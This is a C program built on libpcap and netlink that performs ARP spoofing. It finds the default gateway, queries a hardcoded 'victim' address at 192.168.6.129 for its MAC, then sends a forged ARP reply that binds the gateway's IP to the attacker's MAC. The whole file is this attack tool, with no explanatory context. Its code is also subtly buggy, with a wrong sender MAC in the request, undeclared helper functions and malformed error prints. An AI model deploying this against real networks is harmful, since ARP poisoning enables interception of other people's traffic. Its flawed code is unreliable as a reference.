#include <stdio.h>
#include <pcap/pcap.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/ether.h>
#include <net/if_arp.h>
#include <string.h>   //strncpy
#include <sys/ioctl.h>
#include <net/if.h>   //ifreq
#include <unistd.h>   //close
#include <ifaddrs.h>
#include <netdb.h>
#include <sys/socket.h>
#include <arpa/inet.h>
// get_mac.c
#include <stdlib.h>
#include <linux/rtnetlink.h>
#include <pthread.h>

#define BUFSIZE 8192

struct route_info{
    struct in_addr dstAddr;
    struct in_addr srcAddr;
    struct in_addr gateWay;
    char ifName[IF_NAMESIZE];
};
int readNlSock(int sockFd, char *bufPtr, int seqNum, int pId)

{
    struct nlmsghdr *nlHdr;
    int readLen = 0, msgLen = 0;

    do{

        /* Recieve response from the kernel */
        if((readLen = recv(sockFd, bufPtr, BUFSIZE - msgLen, 0)) < 0){
            perror("SOCK READ: ");

            return -1;
        }

        nlHdr = (struct nlmsghdr *)bufPtr;

        /* Check if the header is valid */
        if((NLMSG_OK(nlHdr, readLen) == 0) || (nlHdr->nlmsg_type == NLMSG_ERROR)){
            perror("Error in recieved packet");

            return -1;
        }

        /* Check if the its the last message */
        if(nlHdr->nlmsg_type == NLMSG_DONE){
            break;
        }else{
            /* Else move the pointer to buffer appropriately */
            bufPtr += readLen;
            msgLen += readLen;
        }

        /* Check if its a multi part message */
        if((nlHdr->nlmsg_flags & NLM_F_MULTI) == 0){
            /* return if its not */

            break;
        }
    } while((nlHdr->nlmsg_seq != seqNum) || (nlHdr->nlmsg_pid != pId));

    return msgLen;
}

/* parse the route info returned */
void parseRoutes(struct nlmsghdr *nlHdr, struct route_info *rtInfo){
    struct rtmsg *rtMsg;
    struct rtattr *rtAttr;
    int rtLen;

    rtMsg = (struct rtmsg *)NLMSG_DATA(nlHdr);

    /* If the route is not for AF_INET or does not belong to main routing table	then return. */
    if((rtMsg->rtm_family != AF_INET) || (rtMsg->rtm_table != RT_TABLE_MAIN))
        return;

    /* get the rtattr field */
    rtAttr = (struct rtattr *)RTM_RTA(rtMsg);
    rtLen = RTM_PAYLOAD(nlHdr);

    for(;RTA_OK(rtAttr,rtLen);rtAttr = RTA_NEXT(rtAttr,rtLen)){
        switch(rtAttr->rta_type){
            case RTA_OIF:
            if_indextoname(*(int *)RTA_DATA(rtAttr), rtInfo->ifName);
            break;

            case RTA_GATEWAY:
            memcpy(&rtInfo->gateWay, RTA_DATA(rtAttr), sizeof(rtInfo->gateWay));
            break;

            case RTA_PREFSRC:
            memcpy(&rtInfo->srcAddr, RTA_DATA(rtAttr), sizeof(rtInfo->srcAddr));
            break;

            case RTA_DST:
            memcpy(&rtInfo->dstAddr, RTA_DATA(rtAttr), sizeof(rtInfo->dstAddr));
            break;
        }

    }

    return;
}


// meat
int get_gatewayip(char *gatewayip, socklen_t size){
    int found_gatewayip = 0;

    struct nlmsghdr *nlMsg;
    struct rtmsg *rtMsg;
    struct route_info *rtInfo;

    char msgBuf[BUFSIZE]; // pretty large buffer
    int sock, len, msgSeq = 0;

    /* Create Socket */
    if((sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_ROUTE)) < 0){
        perror("Socket Creation: ");

        return(-1);
    }


    /* Initialize the buffer */
    memset(msgBuf, 0, BUFSIZE);


    /* point the header and the msg structure pointers into the buffer */
    nlMsg = (struct nlmsghdr *)msgBuf;
    rtMsg = (struct rtmsg *)NLMSG_DATA(nlMsg);

    /* Fill in the nlmsg header*/
    nlMsg->nlmsg_len = NLMSG_LENGTH(sizeof(struct rtmsg)); // Length of message.
    nlMsg->nlmsg_type = RTM_GETROUTE; // Get the routes from kernel routing table .
    nlMsg->nlmsg_flags = NLM_F_DUMP | NLM_F_REQUEST; // The message is a request for dump.
    nlMsg->nlmsg_seq = msgSeq++; // Sequence of the message packet.
    nlMsg->nlmsg_pid = getpid(); // PID of process sending the request.

    /* Send the request */
    if(send(sock, nlMsg, nlMsg->nlmsg_len, 0) < 0){
        fprintf(stderr, "Write To Socket Failed...\n");

        return -1;
    }

    /* Read the response */
    if((len = readNlSock(sock, msgBuf, msgSeq, getpid())) < 0){
        fprintf(stderr, "Read From Socket Failed...\n");

        return -1;
    }

    /* Parse and print the response */
    rtInfo = (struct route_info *)malloc(sizeof(struct route_info));

    for(;NLMSG_OK(nlMsg,len);nlMsg = NLMSG_NEXT(nlMsg,len)){
        memset(rtInfo, 0, sizeof(struct route_info));
        parseRoutes(nlMsg, rtInfo);

        // Check if default gateway
        if (strstr((char *)inet_ntoa(rtInfo->dstAddr), "0.0.0.0")){
            // copy it over
            inet_ntop(AF_INET, &rtInfo->gateWay, gatewayip, size);
            found_gatewayip = 1;
            break;
        }
    }

    free(rtInfo);
    close(sock);

    return found_gatewayip;
}


int main(int argc, char *argv[])
{
    char errbuf[PCAP_ERRBUF_SIZE];
    char * spNetDevName = pcap_lookupdev(errbuf);
    pcap_t* pDes;
    bpf_u_int32 mask;
    bpf_u_int32 net;


    int res,fd;
    struct pcap_pkthdr *header;
    const unsigned char *pkt_data;

    unsigned char req_arp[42];

    struct ifreq ifr;
    char *iface = NULL;
    u_int8_t *att_mac = NULL;
    unsigned char *att_ip = NULL;

    unsigned char victim_ip[4];
    unsigned char victim_mac[ETH_ALEN];
    unsigned char gw_ip[4];

    victim_ip[0] = 192;
    victim_ip[1] = 168;
    victim_ip[2] = 6;
    victim_ip[3] = 129;
    char gateway[20];
    get_gatewayip(gateway, 20);

    fprintf(stderr,"gateway:%s\n",gateway);



    if(0 == spNetDevName){
        printf("errbuf  :[%s]\n",errbuf);
        return 100;
    }else{
        printf("Network Device Name : [%s]\n", spNetDevName);
    }

    if (pcap_lookupnet(spNetDevName, &net, &mask, errbuf) == -1) {
                fprintf(stderr, "Couldn't get netmask for device %s: %s\n", spNetDevName, errbuf);
                net = 0;
                mask = 0;
            }

    pDes = pcap_open_live(spNetDevName, 1500, 1 , 1, errbuf);
    if(0 == pDes){
        printf("[-]Error : [%s]\n",errbuf);
        return 101;
    }else{
        printf("[+]Network Device Ready!\n");
    }

    iface = spNetDevName;
    memset(&ifr, 0, sizeof(ifr));


    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);

    if (0 == ioctl(fd,SIOCGIFHWADDR, &ifr)){    // get mac addr
        att_mac = (u_int8_t *)ifr.ifr_hwaddr.sa_data;

        printf("Mac : %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n",
               att_mac[0],att_mac[1],att_mac[2],att_mac[3],att_mac[4],att_mac[5]
               );
    }
    u_int32_t my_mac[ETH_ALEN];
    memcpy(my_mac, att_mac,6);
    struct ether_header ehp;

    for(int i=0; i<6; i++){
        ehp.ether_shost[i] = att_mac[i];
    }

    if(0 == ioctl(fd, SIOCGIFADDR, &ifr)){
        att_ip = (unsigned char *)ifr.ifr_addr.sa_data;
        printf("IP : %d.%d.%d.%d\n",
               att_ip[2],att_ip[3],att_ip[4],att_ip[5]
               );
    }

    close(fd);

    for(int i=0; i<6; i++){
        ehp.ether_dhost[i] = 0xff;
    }

    u_int32_t my_ip[4];
    for(int i=0; i<4; i++) my_ip[i] = att_ip[2+i];

    ehp.ether_type = htons(ETHERTYPE_ARP);

    printf("DM : ");
    print_MAC(ehp.ether_dhost);
    printf("SM : ");
    print_MAC(ehp.ether_shost);
    printf("proto : %2X\n",ntohs(ehp.ether_type));

    struct arphdr ahp;
    ahp.ar_hrd = htons(ARPHRD_ETHER);
    ahp.ar_pro = htons(ETHERTYPE_IP);
    ahp.ar_hln = ETH_ALEN;
    ahp.ar_pln = 4; // case ipv4 : 4byte
    ahp.ar_op = htons(ARPOP_REQUEST);

    for(int i=0; i<6; i++){
       ahp.__ar_sha[i] = ehp.ether_dhost[i];
    }
    for(int i=0; i<4; i++){
       ahp.__ar_sip[i] = my_ip[i];
    }
    for(int i=0; i<6; i++){
       ahp.__ar_tha[i] = 0x00;
    }

    ahp.__ar_tip[0] = (unsigned char)victim_ip[0];
    ahp.__ar_tip[1] = (unsigned char)victim_ip[1];
    ahp.__ar_tip[2] = (unsigned char)victim_ip[2];
    ahp.__ar_tip[3] = (unsigned char)victim_ip[3];

    memcpy(req_arp, &ehp, sizeof(ehp));
    memcpy(&req_arp[sizeof(ehp)], &ahp, sizeof(ahp));

    if (pcap_sendpacket(pDes,(u_char*) req_arp, 42) != 0){
           fprintf(stderr,"\nError sending the ARPpacket to victim: \n", pcap_geterr(pDes));
           return;
       }


    while((res=pcap_next_ex(pDes, &header, &pkt_data))>=0){
        if(res==0) continue;
        struct ether_header *ch_ehp = (struct ether_header *)pkt_data;
        if(ntohs(ch_ehp->ether_type) != ETHERTYPE_ARP) continue;
        else{
                struct arphdr *ch_ahp = (struct arphdr *)(pkt_data+14);
                if(ntohs(ch_ahp->ar_op)  == ARPOP_REPLY){
                    if(!strncmp(victim_ip, ch_ahp->__ar_sip, 4))
                        memcpy(victim_mac, ch_ahp->__ar_sha,6);
                }
                break;
            }
        }
     memcpy(ehp.ether_dhost, victim_mac, 6);
    memcpy(ahp.__ar_sha, my_mac, 6);
    //memcpy(ahp.__ar_sip, gw_ip, 4);
    memcpy(ahp.__ar_tha, victim_mac, 6);
    ahp.ar_op = htons(ARPOP_REPLY);
     printf("att_MAC: ");
      print_MAC(ahp.__ar_sha);
      inet_aton(gateway, ahp.__ar_sip);

      memcpy(req_arp, &ehp, sizeof(ehp));
     memcpy(&req_arp[sizeof(ehp)], &ahp, sizeof(ahp));

     if (pcap_sendpacket(pDes,(u_char*) req_arp, 42) != 0){
            fprintf(stderr,"\nError sending the ARPpacket to victim: \n", pcap_geterr(pDes));
            return;
        }

    pcap_close(pDes);
    return 0;
}

void print_IP(unsigned long ip){
    for(int i=0; i<4; i++){
        printf("%d",*((unsigned char*)(&ip)+(3-i)));
        if(3!=i) printf(".");
        else printf("\n");
    }
}


void print_IP_str(unsigned char * ip){
    for(int i=0; i<4; i++){
        printf("%d",*((unsigned char*)ip+i));
        if(3!=i) printf(".");
        else printf("\n");
    }
}


void print_MAC(u_int8_t * mac){
    for(int i=0; i<6; i++){
        printf("%02X",*(mac+i));
        if(5!=i) printf(":");
        else printf("\n");
    }
}
